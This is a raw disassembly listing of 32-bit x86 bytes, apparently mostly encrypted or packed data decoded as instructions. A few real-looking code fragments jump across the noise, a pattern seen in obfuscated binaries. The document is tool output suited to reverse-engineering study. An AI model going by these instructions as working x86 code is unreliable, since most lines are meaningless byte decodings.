  40fff9:	xchg   edx,eax
  40fffa:	test   BYTE PTR [ecx+0x4e],dl
  40fffd:	xor    esi,DWORD PTR [ebx-0x6cf60afa]
  410003:	jne    0x40ffa9
  410005:	and    BYTE PTR [edx+0x0],bl
  410008:	hlt    
  410009:	lea    ebx,[edx+0x576e4656]
  41000f:	ret    0x9547
  410012:	iret   
  410013:	xchg   BYTE PTR [ecx-0x2ac43c42],dl
  410019:	dec    DWORD PTR [esi+eiz*1]
  41001c:	add    BYTE PTR [edi+0x6c609b98],dh
  410022:	jo     0x410061
  410024:	test   al,0x85
  410026:	mov    ch,0xa6
  410028:	adc    ah,al
  41002a:	loop   0x410009
  41002c:	jmp    0x410014
  41002e:	bound  edx,QWORD PTR [edx]
  410030:	daa    
  410031:	xchg   ebx,eax
  410032:	int    0xb9
  410034:	inc    ebx
  410035:	aam    0xb2
  410037:	mov    al,0x29
  410039:	outs   dx,BYTE PTR ss:[esi]
  41003b:	addr16 out 0x52,al
  41003e:	outs   dx,DWORD PTR ds:[esi]
  41003f:	loopne 0x41008f
  410041:	test   al,0xf6
  410043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410044:	sbb    DWORD PTR [edx-0x4],edi
  410047:	inc    edi
  410048:	sti    
  410049:	cmc    
  41004a:	sbb    eax,DWORD PTR [eax+0x5d5263ce]
  410050:	jns    0x410043
  410052:	stos   BYTE PTR es:[edi],al
  410053:	mov    ?,WORD PTR [eax]
  410055:	xor    ah,bl
  410057:	jp     0x410000
  410059:	cmc    
  41005a:	jbe    0x410086
  41005c:	retf   
  41005d:	cdq    
  41005e:	repz aas 
  410060:	sbb    eax,ebx
  410062:	ins    BYTE PTR es:[edi],dx
  410063:	iret   
  410064:	jecxz  0x41002d
  410066:	jo     0x41001d
  410068:	add    DWORD PTR [eax-0x3f],ebp
  41006b:	out    0xc9,eax
  41006d:	sbb    esp,DWORD PTR [eax-0x66]
  410070:	push   esp
  410071:	es call 0xd146:0x73eb000a
  410079:	jp     0x4100bf
  41007b:	dec    edi
  41007c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41007d:	jmp    0xd661:0xe322dd63
  410084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410085:	push   es
  410086:	(bad)
  410089:	cmp    BYTE PTR [ecx-0x15],dh
  41008c:	hlt    
  41008d:	push   ecx
  41008e:	mov    ebx,0x8ba5ff81
  410093:	rcr    DWORD PTR [esi-0x167276cb],cl
  410099:	sub    esp,DWORD PTR [ebp-0x35]
  41009c:	or     BYTE PTR [esi+ebp*8],dl
  41009f:	push   ss
  4100a0:	add    al,0x73
  4100a2:	dec    edi
  4100a3:	arpl   WORD PTR [ebx-0x436fe228],bp
  4100a9:	jmp    eax
  4100ab:	dec    esp
  4100ac:	pop    ecx
  4100ad:	add    BYTE PTR [ebp-0x31],bh
  4100b0:	xor    al,0xb5
  4100b2:	add    edx,ecx
  4100b4:	or     bh,BYTE PTR [esi+0x26]
  4100b7:	pusha  
  4100b8:	jo     0x410112
  4100ba:	xor    DWORD PTR [edi+0x21],ebp
  4100bd:	retf   0xd295
  4100c0:	mov    al,ds:0x29eb422e
  4100c5:	clc    
  4100c6:	cmp    eax,0xf197a72a
  4100cb:	stos   BYTE PTR es:[edi],al
  4100cc:	ret    0x72bc
  4100cf:	inc    ebx
  4100d0:	outs   dx,DWORD PTR ds:[esi]
  4100d1:	cmp    ah,BYTE PTR [ebx]
  4100d3:	and    BYTE PTR [edx-0xf18a90f],dh
  4100d9:	pushf  
  4100da:	dec    dx
  4100dc:	sub    cl,BYTE PTR [ebp+ebp*2+0x24dbeef0]
  4100e3:	rol    DWORD PTR [edi+0x24a57e83],0xac
  4100ea:	cli    
  4100eb:	mov    edx,0xd450c9f8
  4100f0:	dec    ebp
  4100f1:	or     BYTE PTR [eax+0x12780984],0xe6
  4100f8:	dec    eax
  4100f9:	call   0x6c5:0x9d05d04a
  410100:	inc    esi
  410101:	jp     0x410179
  410103:	pop    ecx
  410104:	retf   
  410105:	lods   eax,DWORD PTR ds:[esi]
  410106:	xor    ebx,DWORD PTR [edx-0x6d]
  410109:	and    al,0xa8
  41010b:	xor    BYTE PTR [edx],0x57
  41010e:	inc    eax
  41010f:	nop
  410110:	ja     0x410184
  410112:	mov    edx,DWORD PTR [esi]
  410114:	sahf   
  410115:	fwait
  410116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410118:	xchg   esp,eax
  410119:	or     DWORD PTR [eax+0x5fe87f41],0x6008af3f
  410123:	jge    0x410170
  410125:	aam    0xfb
  410127:	iret   
  410128:	scas   eax,DWORD PTR es:[edi]
  410129:	adc    DWORD PTR [edx+0x28126a46],ebx
  41012f:	out    0x1a,eax
  410131:	ds mov edi,0xfcb94091
  410137:	inc    ebp
  410138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410139:	arpl   dx,bp
  41013b:	cs or  esp,0xffffff92
  41013f:	jns    0x410106
  410141:	mov    esi,0x4cb4060a
  410146:	test   edi,0x381c904b
  41014c:	int3   
  41014d:	jecxz  0x410187
  41014f:	outs   dx,DWORD PTR ds:[esi]
  410151:	in     eax,0x3e
  410153:	idiv   al
  410155:	aas    
  410156:	mov    al,ds:0xbdc3f0e5
  41015b:	push   0x1656586f
  410160:	jg     0x410168
  410162:	sub    al,0xcc
  410164:	adc    BYTE PTR [esp+ebx*1+0x11321976],ch
  41016b:	dec    ebx
  41016c:	ja     0x410121
  41016e:	mov    ds:0x65db3b95,al
  410173:	jns    0x4100fb
  410175:	mov    esp,0xa2053a28
  41017a:	cmp    eax,0x9f739750
  41017f:	loopne 0x4101e9
  410181:	cmp    DWORD PTR [eax-0x20f2d945],ebx
  410187:	mov    dh,0x30
  410189:	xchg   esp,eax
  41018a:	(bad)  
  41018b:	cwde   
  41018c:	pop    es
  41018d:	hlt    
  41018e:	or     al,0x86
  410190:	add    ebx,DWORD PTR [ebp+0x54]
  410193:	fwait
  410194:	cmp    eax,0xd35afa0e
  410199:	inc    esi
  41019a:	int    0xc3
  41019c:	cmc    
  41019d:	and    al,0xdb
  41019f:	jno    0x410217
  4101a1:	mov    esi,eax
  4101a3:	js     0x4101eb
  4101a5:	fild   WORD PTR ds:[edi-0x75]
  4101a9:	push   es
  4101aa:	fsubr  QWORD PTR [ebx-0x3f]
  4101ad:	out    0x51,al
  4101af:	leave  
  4101b0:	in     al,dx
  4101b1:	adc    ebp,DWORD PTR [ebp+0x0]
  4101b4:	mov    ebp,0x8ad477c2
  4101b9:	push   esp
  4101ba:	xchg   edi,eax
  4101bc:	mov    ch,0x8a
  4101be:	int3   
  4101bf:	xor    ebp,0x441a1898
  4101c5:	ror    BYTE PTR [edi],1
  4101c7:	xchg   esi,eax
  4101c8:	inc    edi
  4101c9:	test   BYTE PTR [edi+edx*1-0x10],cl
  4101cd:	mov    edi,0x47618404
  4101d2:	pop    ebx
  4101d3:	cmp    BYTE PTR [ebp+ebx*1+0x51],bh
  4101d7:	or     DWORD PTR [eax+0x69a0c3e3],ebp
  4101dd:	retf   
  4101de:	inc    ecx
  4101df:	add    ebx,DWORD PTR [esi+0x2d]
  4101e2:	xchg   edx,eax
  4101e3:	pop    eax
  4101e4:	scas   al,BYTE PTR es:[edi]
  4101e5:	cs mov esi,0x742202ec
  4101eb:	aaa    
  4101ec:	xor    eax,esi
  4101ee:	out    dx,al
  4101ef:	mov    WORD PTR [ecx+0x1d],ds
  4101f2:	xchg   ecx,eax
  4101f3:	mov    dl,0x88
  4101f5:	and    eax,0x8086aae3
  4101fa:	mov    eax,0xa9c75440
  4101ff:	imul   esi,ebp,0x8b7834de
  410205:	adc    eax,0xb39ed3ff
  41020a:	rcr    DWORD PTR [edx+0x5006f94d],1
  410210:	es dec esp
  410212:	sub    DWORD PTR [esi+ebp*2-0x4a],edi
  410216:	pop    edi
  410217:	xor    eax,0xe6d8dab4
  41021c:	hlt    
  41021d:	xor    eax,0x783bcb7
  410222:	and    esp,DWORD PTR [ebp+0x3fffe207]
  410228:	cmp    BYTE PTR [edi-0x400eeccc],dh
  41022e:	sbb    BYTE PTR [ebp+0x11],dh
  410231:	cld    
  410232:	ins    BYTE PTR es:[edi],dx
  410233:	xchg   ecx,eax
  410234:	retf   0x278
  410237:	jnp    0x4101e9
  410239:	sbb    esi,DWORD PTR [esi-0x64]
  41023c:	jge    0x4101ca
  41023e:	call   0x9524653
  410243:	out    0x35,eax
  410245:	ja     0x410238
  410247:	fst    QWORD PTR [ebx-0x6f]
  41024a:	mov    fs,WORD PTR [esi]
  41024c:	pop    esi
  41024d:	jnp    0x41025a
  41024f:	adc    DWORD PTR [ecx-0x1c9d1bcb],0x6cb46d3c
  410259:	inc    edx
  41025a:	in     al,0x46
  41025c:	or     eax,0xf5ca11c1
  410261:	ins    BYTE PTR es:[edi],dx
  410262:	pop    ecx
  410263:	xor    eax,0xfbea88e1
  410268:	xchg   DWORD PTR [esi+0x4a],esi
  41026b:	out    0x5b,eax
  41026d:	pop    ss
  41026e:	jmp    0x410264
  410270:	or     ah,BYTE PTR [edx+edx*2+0x74]
  410274:	adc    DWORD PTR [edx],ebp
  410276:	mov    esp,0xc0b36b42
  41027b:	pop    esp
  41027c:	inc    ebx
  41027d:	sbb    edx,DWORD PTR ss:[ebx-0x41]
  410281:	mov    ecx,0x91e61f0f
  410286:	dec    esi
  410287:	fs cld 
  410289:	je     0x41028a
  41028b:	icebp  
  41028c:	lahf   
  41028d:	arpl   WORD PTR [eax+0x21806931],bp
  410293:	mov    WORD PTR [edx+edi*4+0x4099d900],fs
  41029a:	push   eax
  41029b:	aas    
  41029c:	adc    BYTE PTR [edi+0x9],cl
  41029f:	add    eax,0xd59e472
  4102a4:	pop    esi
  4102a5:	inc    edx
  4102a6:	push   es
  4102a7:	popf   
  4102a8:	jl     0x41030e
  4102aa:	adc    DWORD PTR ss:[eax+0x48],esp
  4102ae:	push   ds
  4102af:	inc    ecx
  4102b0:	mov    cl,0xfe
  4102b2:	test   al,0xbb
  4102b4:	cmp    DWORD PTR [ecx],ecx
  4102b6:	pop    esi
  4102b7:	in     eax,dx
  4102b8:	rol    DWORD PTR [eax-0x51c9dbd1],1
  4102be:	or     eax,0xbdb6a615
  4102c3:	cmp    eax,0x80cc014e
  4102c8:	jle    0x410309
  4102ca:	(bad)  
  4102cb:	icebp  
  4102cc:	outs   dx,DWORD PTR ds:[esi]
  4102cd:	rol    WORD PTR [eax+eiz*4-0x39],cl
  4102d2:	js     0x410261
  4102d4:	iret   
  4102d5:	(bad)  [ecx]
  4102d7:	out    dx,eax
  4102d8:	jbe    0x41027e
  4102da:	push   esi
  4102db:	inc    esp
  4102dc:	or     eax,0xfda5d6ee
  4102e1:	aad    0xcf
  4102e3:	push   edx
  4102e4:	addr16 mov edx,es
  4102e7:	sar    esp,cl
  4102e9:	inc    ebp
  4102ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102eb:	mov    ch,0xdf
  4102ed:	sbb    eax,0xff4263c8
  4102f2:	icebp  
  4102f3:	sbb    DWORD PTR [edi],eax
  4102f5:	cmp    eax,0x634e754a
  4102fa:	sub    bl,0xe8
  4102fd:	cld    
  4102fe:	lock ss jle 0x4102d6
  410302:	pop    ds
  410303:	iret   
  410304:	cmp    al,0x98
  410306:	push   es
  410307:	popf   
  410308:	xchg   edx,eax
  410309:	xchg   ebp,eax
  41030a:	push   0xffffffef
  41030c:	(bad)  
  41030d:	jne    0x410374
  41030f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410310:	(bad)  
  410311:	pop    ds
  410312:	js     0x4102f8
  410314:	outs   dx,BYTE PTR ds:[esi]
  410315:	test   eax,0x23269afa
  41031a:	fdiv   st,st(0)
  41031c:	sbb    eax,0x9bcffeb1
  410321:	js     0x410351
  410323:	stc    
  410324:	fcom   DWORD PTR [esi+0x45]
  410327:	inc    esp
  410328:	test   ch,ah
  41032a:	pushf  
  41032b:	sbb    DWORD PTR [esi+0x13],eax
  41032e:	xchg   ebx,eax
  41032f:	mov    edi,esi
  410331:	dec    ecx
  410332:	fwait
  410333:	and    al,0x11
  410335:	xchg   ecx,eax
  410336:	lock push ds
  410338:	shl    edi,0x82
  41033b:	popa   
  41033c:	ins    BYTE PTR es:[edi],dx
  41033d:	dec    eax
  41033e:	adc    DWORD PTR [edx+0x23],0x4a
  410342:	inc    ecx
  410343:	push   ebx
  410344:	mov    WORD PTR [edx],ds
  410346:	out    dx,al
  410347:	fs adc eax,0x40f5ebcb
  41034d:	imul   eax,ebp,0xb79777c3
  410353:	pushf  
  410354:	in     al,0xff
  410356:	or     ebp,ebx
  410358:	xor    al,ch
  41035a:	cmp    al,0xfa
  41035c:	mov    DWORD PTR [edi+edx*4+0x65],edx
  410360:	(bad)
  410363:	push   ebx
  410364:	add    BYTE PTR [ebp-0x3d0112b6],0x2f
  41036b:	gs pusha 
  41036d:	push   0x3a
  41036f:	je     0x4103c0
  410371:	push   ecx
  410372:	sbb    eax,DWORD PTR [edx-0x23]
  410375:	clc    
  410376:	mov    eax,0x5c2b3e7a
  41037b:	xor    DWORD PTR [ebp+edx*8-0x67],edi
  41037f:	mov    esi,DWORD PTR [ebx-0x668e4ed3]
  410385:	loope  0x41034e
  410387:	loop   0x4103a5
  410389:	push   edi
  41038a:	sbb    DWORD PTR [ecx+0x19],esp
  41038d:	(bad)  
  41038e:	xchg   edi,eax
  41038f:	jl     0x410407
  410391:	lods   al,BYTE PTR ds:[esi]
  410392:	pop    ss
  410393:	jae    0x41036b
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x3794:0x9b59bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	pushf  
  4103db:	frstor es:[esi+esi*1+0x20]
  4103e0:	jl     0x410402
  4103e2:	ins    BYTE PTR es:[edi],dx
  4103e3:	jg     0x41043d
  4103e5:	add    eax,0x1931e7ad
  4103ea:	mov    al,ds:0x574ef34a
  4103ef:	sbb    BYTE PTR [ebx+0x7430e1c9],bl
  4103f5:	push   ebp
  4103f6:	sti    
  4103f7:	mov    DWORD PTR [esi+ebx*1+0x2d],edi
  4103fb:	adc    eax,0x1c9b7404
  410400:	cmp    DWORD PTR [edx-0x25d2cee5],0x1
  410407:	adc    ecx,DWORD PTR [ebx-0x73a029d7]
  41040d:	adc    BYTE PTR [edx+edi*4-0x16ba6c9c],bh
  410414:	xchg   esi,eax
  410415:	pusha  
  410416:	or     edi,DWORD PTR [ebx]
  410418:	mov    cl,0x89
  41041a:	test   ecx,edx
  41041c:	(bad)  
  41041d:	out    dx,al
  41041e:	fistp  QWORD PTR [edi-0x175ca4f9]
  410424:	fld    st(6)
  410426:	lahf   
  410427:	lock or ebp,esp
  41042a:	outs   dx,DWORD PTR ds:[esi]
  41042b:	fisttp WORD PTR [ebx]
  41042d:	add    ebp,edi
  41042f:	out    0x3a,al
  410431:	popf   
  410432:	ins    DWORD PTR es:[edi],dx
  410433:	outs   dx,BYTE PTR ds:[esi]
  410434:	xchg   ecx,eax
  410435:	cs and eax,0x428a6911
  41043b:	inc    esp
  41043c:	dec    edi
  41043d:	sub    eax,0x817e791
  410442:	and    BYTE PTR [edi-0x13],ah
  410445:	ja     0x4103de
  410447:	and    BYTE PTR ds:0xac124975,ah
  41044d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41044e:	xor    al,0x92
  410450:	pop    edi
  410451:	test   BYTE PTR [eax],0x30
  410454:	push   0xffffffc9
  410456:	addr16 mov ebx,0xef859308
  41045c:	test   eax,0xb7e47518
  410461:	pushf  
  410462:	cmp    al,0xcf
  410464:	retf   
  410465:	gs (bad) 
  410467:	not    BYTE PTR [ebx+eax*2-0x2b772843]
  41046e:	sbb    eax,0x3e4a9aaf
  410473:	pusha  
  410474:	jmp    0x410468
  410476:	dec    ecx
  410477:	rol    DWORD PTR fs:[edx],0x24
  41047b:	lds    eax,FWORD PTR gs:[esi]
  41047e:	mov    al,0xe9
  410480:	mov    ss,WORD PTR [edi]
  410482:	jno    0x4104b1
  410484:	or     BYTE PTR [ecx],0x0
  410487:	mov    dl,0xad
  410489:	mov    ah,bh
  41048b:	inc    eax
  41048c:	xor    BYTE PTR [edi+0x1ee07c8b],ah
  410492:	int    0xe3
  410494:	call   0x78fc:0x4ac4c641
  41049b:	mov    ecx,DWORD PTR ds:[edi-0x3f]
  41049f:	jl     0x410431
  4104a1:	mov    esi,0x89fbef71
  4104a6:	mov    bl,0xa8
  4104a8:	inc    ebx
  4104a9:	xchg   esi,eax
  4104aa:	sub    eax,0x83a0016c
  4104af:	inc    eax
  4104b0:	cmp    al,0x61
  4104b2:	pop    esp
  4104b3:	js     0x4104d0
  4104b5:	in     eax,0x3f
  4104b7:	push   esp
  4104b8:	ret    0x7912
  4104bb:	aad    0xc9
  4104bd:	(bad)  
  4104bf:	pop    edi
  4104c0:	sbb    eax,0xa015649e
  4104c5:	sbb    BYTE PTR [edi-0x7b792529],dh
  4104cb:	xor    eax,0x4557877a
  4104d1:	pop    ecx
  4104d2:	push   edx
  4104d3:	jp     0x4104e8
  4104d5:	adc    eax,0x74e4eb65
  4104da:	jl     0x41053a
  4104dc:	(bad)  
  4104dd:	ins    BYTE PTR es:[edi],dx
  4104de:	cmp    eax,0xe78b2a1d
  4104e3:	loop   0x410482
  4104e5:	aaa    
  4104e6:	sbb    eax,0x7e4cfd5a
  4104eb:	xor    eax,0xb604829a
  4104f0:	sahf   
  4104f1:	aas    
  4104f2:	lods   al,BYTE PTR ds:[esi]
  4104f3:	sbb    al,0xed
  4104f5:	pop    edx
  4104f6:	mov    al,0xf8
  4104f8:	retf   
  4104f9:	(bad)
  4104fc:	jb     0x4104cd
  4104fe:	dec    esp
  4104ff:	mov    eax,ss
  410501:	or     edx,DWORD PTR [edx]
  410503:	cdq    
  410504:	jg     0x4104b3
  410506:	fucom  st(2)
  410508:	mov    bh,0xf
  41050a:	hlt    
  41050b:	jmp    0x410569
  41050d:	mov    esi,0xf4023e15
  410512:	ror    DWORD PTR [edx+0x6c],1
  410515:	jmp    0x410588
  410517:	rcl    DWORD PTR [edx-0x63],0x92
  41051b:	mov    bh,0x7d
  41051d:	cmp    eax,DWORD PTR [eax]
  41051f:	lahf   
  410520:	mov    esp,0xe478268b
  410525:	jbe    0x41058a
  410527:	jp     0x410552
  410529:	in     eax,dx
  41052a:	xor    DWORD PTR [ebx],esi
  41052c:	out    dx,eax
  41052d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41052e:	xor    DWORD PTR [eax+ecx*2+0x23],0xffffffd6
  410533:	es call 0x26ca:0xd8c700a1
  41053b:	mov    bl,0xd
  41053d:	xchg   ecx,eax
  41053e:	push   edx
  41053f:	jmp    0x4392:0xc64b4dee
  410546:	(bad)  
  410547:	push   0x5f
  410549:	inc    ecx
  41054a:	lea    edi,[ebx+0x68]
  41054d:	je     0x4105af
  41054f:	ds call 0x7cc583f0
  410555:	sbb    DWORD PTR [eax],esi
  410557:	xor    al,0x16
  410559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41055a:	sbb    dl,BYTE PTR [edx]
  41055c:	test   BYTE PTR [esi+0x6a],ah
  41055f:	addr16 sub dl,al
  410562:	jl     0x4104ea
  410564:	push   edi
  410565:	call   0xa6d1e2bc
  41056a:	popf   
  41056b:	stos   DWORD PTR es:[edi],eax
  41056c:	mov    bh,0xa2
  41056e:	or     BYTE PTR [edx-0x4f80731f],bl
  410574:	mov    dl,0x8c
  410576:	iret   
  410577:	cli    
  410578:	vcvtsd2si ecx,xmm4
  41057c:	retf   
  41057d:	jmp    0xf3945d1e
  410582:	sub    bh,BYTE PTR [edx+0x8]
  410585:	cmp    al,0x83
  410587:	mov    dl,0xe2
  410589:	inc    ecx
  41058a:	scas   eax,DWORD PTR es:[edi]
  41058b:	std    
  41058c:	and    al,0x24
  41058e:	jno    0x41059d
  410590:	retf   0xc0b1
  410593:	inc    eax
  410594:	jne    0x410593
  410596:	(bad)  
  410597:	jmp    0x41055c
  410599:	xor    esp,DWORD PTR [ecx-0x17e5af06]
  41059f:	and    esi,DWORD PTR [ebp+0x2e]
  4105a2:	fbstp  TBYTE PTR [edx+eiz*1+0x7a114357]
  4105a9:	sub    al,0x5a
  4105ab:	inc    esp
  4105ac:	push   ss
  4105ad:	pusha  
  4105ae:	mov    ebp,0x91d77640
  4105b3:	je     0x4105e1
  4105b5:	retf   0xf22e
  4105b8:	in     eax,0x4
  4105ba:	jmp    0x410603
  4105bc:	pop    es
  4105bd:	mov    edi,es
  4105bf:	leave  
  4105c0:	xlat   BYTE PTR ds:[ebx]
  4105c1:	mov    bl,0x78
  4105c3:	and    eax,0xbde52cdc
  4105c8:	or     al,0x73
  4105ca:	je     0x41062f
  4105cc:	imul   esi,ecx,0xe86c9ac0
  4105d2:	or     BYTE PTR [ecx-0x3ab0500f],ah
  4105d8:	adc    eax,0x2f8e00d7
  4105dd:	data16 adc al,0x33
  4105e0:	and    esp,DWORD PTR [eax+ecx*8]
  4105e3:	inc    ebp
  4105e4:	jb     0x41061d
  4105e6:	inc    esi
  4105e7:	xor    DWORD PTR [ecx-0x12],ebp
  4105ea:	and    DWORD PTR [edi-0x78],edi
  4105ed:	mov    ch,0x7d
  4105ef:	and    ebx,esp
  4105f1:	inc    edi
  4105f2:	jmp    0x2b82031
  4105f7:	retf   0x950f
  4105fa:	push   ss
  4105fb:	push   ecx
  4105fc:	lock jge 0x4105e1
  4105ff:	jg     0x4105f9
  410601:	inc    ecx
  410602:	fcom   DWORD PTR [eax]
  410604:	fdivp  st(6),st
  410606:	xor    BYTE PTR [esp+eax*4-0x2296d90],cl
  41060d:	xor    bl,BYTE PTR [edx+ecx*1-0xe693229]
  410614:	xchg   BYTE PTR [esi+0x18691400],cl
  41061a:	mov    ch,0xb0
  41061c:	rol    cl,1
  41061e:	ret    0xaa1c
  410621:	sub    edi,DWORD PTR [edi+edx*4-0x1f]
  410625:	inc    edx
  410626:	out    0xb0,eax
  410628:	xchg   edx,eax
  410629:	fwait
  41062a:	xor    DWORD PTR [ebp-0x6],edx
  41062d:	sub    DWORD PTR [esi],ecx
  41062f:	jne    0x41064c
  410631:	push   0x3dd8e2a5
  410636:	sahf   
  410637:	outs   dx,DWORD PTR ds:[esi]
  410638:	mov    al,0x69
  41063a:	sbb    al,0x32
  41063c:	push   edi
  41063d:	mov    dh,0xa0
  41063f:	sbb    eax,0xfed734ed
  410644:	adc    al,0x97
  410646:	pop    edi
  410647:	xor    ch,BYTE PTR [edx-0x33d19d02]
  41064d:	sbb    al,0x52
  41064f:	leave  
  410650:	xchg   ebp,eax
  410651:	mov    ebx,0x58d420a6
  410656:	ficom  WORD PTR [ebx+ecx*1]
  410659:	dec    ebx
  41065a:	sbb    BYTE PTR [esi+0x451bde83],cl
  410660:	pop    ecx
  410661:	inc    ebp
  410662:	xchg   ebx,eax
  410663:	dec    ebx
  410664:	or     DWORD PTR [esi+0x71782e6b],eax
  41066a:	aaa    
  41066b:	mov    ds,WORD PTR [eax-0xf]
  41066e:	jle    0x410614
  410670:	mov    ah,0x5b
  410672:	mov    ecx,DWORD PTR [ebp+0x564b5f7d]
  410678:	xchg   edx,eax
  410679:	cmp    BYTE PTR [eax-0xa],dh
  41067c:	xchg   ebp,ebp
  41067e:	adc    al,0x32
  410680:	jge    0x4106df
  410682:	(bad)  
  410683:	aaa    
  410684:	and    dh,BYTE PTR [eax+0xe58600c]
  41068a:	and    al,0xab
  41068c:	add    edx,DWORD PTR [edi-0x628e4967]
  410692:	sub    DWORD PTR [esi],edi
  410694:	mov    ecx,0xb50981ff
  410699:	mov    ebp,0xc2dc7085
  41069e:	cmp    DWORD PTR [edx+0x15a21d49],ecx
  4106a4:	ret    
  4106a5:	rol    edi,cl
  4106a7:	or     eax,edi
  4106a9:	pop    esp
  4106aa:	bound  ebx,QWORD PTR [esi+0x5585f5b7]
  4106b0:	pop    esp
  4106b1:	jno    0x410658
  4106b3:	mov    cl,0x9c
  4106b5:	xchg   ch,bh
  4106b7:	lods   al,BYTE PTR ds:[esi]
  4106b8:	out    0x59,eax
  4106ba:	sti    
  4106bb:	pop    es
  4106bc:	inc    esi
  4106bd:	arpl   WORD PTR [esi+0x1f194c9f],sp
  4106c3:	xor    edi,DWORD PTR [ebx+0x79f5ec16]
  4106c9:	retf   0x9938
  4106cc:	cmp    BYTE PTR [ebx-0x13334083],cl
  4106d2:	xchg   ebp,eax
  4106d3:	js     0xfd6da65
  4106d9:	sub    BYTE PTR [ecx+0x51],0x26
  4106dd:	mov    ds:0x64772689,eax
  4106e2:	or     DWORD PTR [edx+0x36],edi
  4106e5:	xchg   edx,eax
  4106e6:	out    dx,eax
  4106e7:	dec    edi
  4106e8:	push   cs
  4106e9:	lods   al,BYTE PTR ds:[esi]
  4106ea:	fldcw  WORD PTR [ebx]
  4106ec:	imul   eax,DWORD PTR [eax+0x42],0xffffffa6
  4106f0:	and    DWORD PTR [edi-0x78],esp
  4106f3:	in     al,0x54
  4106f5:	xchg   ebp,eax
  4106f6:	outs   dx,BYTE PTR ds:[esi]
  4106f7:	dec    edx
  4106f8:	inc    eax
  4106f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106fa:	sbb    BYTE PTR [ecx],bl
  4106fc:	pop    ebp
  4106fd:	mov    ds:0x7bf13449,eax
  410702:	test   DWORD PTR [edi-0x4431a10e],ecx
  410708:	push   eax
  410709:	inc    ecx
  41070a:	cld    
  41070b:	xor    eax,0xba199e07
  410710:	fidivr WORD PTR ds:0x49b5b146
  410716:	ins    DWORD PTR es:[edi],dx
  410717:	jmp    0x42f2:0xc9398c53
  41071e:	mov    DWORD PTR [ebx],edi
  410720:	mov    eax,0x63fdb78a
  410725:	sti    
  410726:	mov    cl,0x36
  410728:	mov    cl,0x48
  41072a:	das    
  41072b:	jb     0x4107a5
  41072d:	outs   dx,BYTE PTR ds:[esi]
  41072e:	adc    dh,BYTE PTR [ebx-0x2517ce29]
  410734:	fsubr  QWORD PTR ds:0x7029e12e
  41073a:	cmp    BYTE PTR [edx+0x55172280],ah
  410740:	daa    
  410741:	repz xchg ecx,eax
  410743:	in     eax,0xad
  410745:	cld    
  410746:	jns    0x41073d
  410748:	mov    bl,0xb6
  41074a:	fisttp WORD PTR [eax]
  41074c:	fsubrp st(0),st
  41074e:	pop    ebp
  41074f:	jns    0x410745
  410751:	retf   
  410752:	mov    ch,0x97
  410754:	xor    ch,BYTE PTR [ebp+0x3c543b70]
  41075a:	ja     0x410705
  41075c:	loopne 0x410755
  41075e:	icebp  
  41075f:	repnz xchg esp,eax
  410761:	mov    al,0x7d
  410763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410764:	adc    eax,0x1771145c
  410769:	in     eax,dx
  41076a:	or     bl,dl
  41076c:	mov    ebx,0x88e64a31
  410771:	mov    esi,0xf66f0a4f
  410776:	dec    ebx
  410777:	cmp    eax,DWORD PTR [edx+ebp*8+0x1824bed0]
  41077e:	jmp    0x4107fe
  410780:	xlat   BYTE PTR ds:[ebx]
  410781:	test   al,0x4e
  410783:	xchg   ebx,eax
  410784:	das    
  410785:	jnp    0x4107e0
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	xchg   ebp,eax
  4107a9:	mov    bh,0x46
  4107ab:	xchg   ecx,eax
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x41082f
  4107b5:	jmp    0xe814:0x7291c9d1
  4107bc:	cmp    al,0xe0
  4107be:	mov    ebp,0x65bd0185
  4107c3:	push   esi
  4107c4:	inc    ebx
  4107c5:	mov    bh,0x45
  4107c7:	push   ebx
  4107c8:	fist   WORD PTR [ecx+0x39]
  4107cb:	mov    ah,0x4f
  4107cd:	push   esi
  4107ce:	fwait
  4107cf:	add    ebx,eax
  4107d1:	jmp    0x5133b6d
  4107d6:	sub    DWORD PTR ds:0xebfb8a3d,ecx
  4107dc:	addr16 sahf 
  4107de:	and    eax,0x4f1bab77
  4107e3:	ja     0x4107b3
  4107e5:	icebp  
  4107e6:	outs   dx,BYTE PTR ds:[esi]
  4107e7:	(bad)  
  4107e8:	lods   eax,DWORD PTR ds:[esi]
  4107e9:	jp     0x4107dd
  4107eb:	xor    eax,0xb55d2b8b
  4107f0:	jmp    0xef26d48a
  4107f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107f6:	push   ebp
  4107f7:	fnstsw WORD PTR [esi+esi*4+0x24a18d98]
  4107fe:	push   ebp
  4107ff:	push   edx
  410800:	in     al,0x7b
  410802:	cmp    BYTE PTR [edi],dh
